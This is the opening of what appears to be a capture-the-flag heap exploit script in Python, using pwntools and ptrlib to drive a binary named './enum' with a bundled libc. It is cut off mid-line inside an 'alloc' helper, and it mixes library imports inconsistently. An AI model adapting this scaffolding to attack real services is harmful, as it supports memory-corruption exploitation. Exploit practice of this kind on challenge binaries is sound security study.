import sys, threading
threading.Thread(target=lambda: sys.stdout.buffer.write(b'\x90' * 0x40)).start()
import sys
sys.path.insert(0, "/notebooks/")
import pwn

from IPython.core.debugger import set_trace
from IPython import embed


from ptrlib import *


elf  = ELF('./enum')
libc = ELF('./libc.so.6')
context.binary = './enum'
context.log_level = 'debug'
context.arch = 'amd64'
debug = False
#CFLAGS="-Wall -g -fno-stack-protector"

if debug:
  r = process('./enum', env={'LD_PRELOAD': './libc.so.6'})
  gdb.attach(r)
  pause()

def alloc(size):
  r.sendlineafter('idx:', '0')
  r.sendlineafter('size:', str(size))
  r.sendlineafter('value:', '0' * size)
  r.rec
